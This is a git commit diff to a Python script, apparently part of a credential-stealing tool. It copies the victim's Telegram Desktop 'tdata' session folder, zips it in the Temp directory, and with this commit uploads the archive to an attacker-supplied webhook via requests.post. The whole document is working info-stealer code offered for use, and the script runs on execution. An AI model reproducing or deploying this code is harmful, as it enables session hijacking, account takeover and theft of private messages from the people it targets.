4e8483c4403eb03c54542cc3c43e810ae23b554b
Lawxsz <116668706+Lawxsz@users.noreply.github.com>
2023-02-21 18:55:57 -0300

    Telegram + send to webhook

--- scripts/telegram.py
+++ scripts/telegram.py
@@ -1,7 +1,7 @@
-import os, os.path, shutil
-
+import os, os.path, shutil, requests
 user = os.path.expanduser("~")
 
+hook = "HOOK_HERE" # U WEBHOOK HERE!
 
 def telegram():
   if os.path.exists(user+"\\AppData\\Roaming\\Telegram Desktop\\tdata"):
@@ -10,6 +10,13 @@ def telegram():
     shutil.make_archive(user+'\\AppData\\Local\\Temp\\tdata_session', 'zip', user+'\\AppData\\Local\\Temp\\tdata_session')
    except:
     pass
-    os.remove(user+"\\AppData\\Local\\Temp\\tdata_session")
-
+    try:
+     os.remove(user+"\\AppData\\Local\\Temp\\tdata_session")
+    except:
+        pass
+    with open(user+'\\AppData\\Local\\Temp\\tdata_session.zip', 'rb') as f:
+     payload = {
+        'file': (user+'\\AppData\\Local\\Temp\\tdata_session.zip', f, 'zip')
+     }    
+     r = requests.post(hook, files=payload)
 telegram()
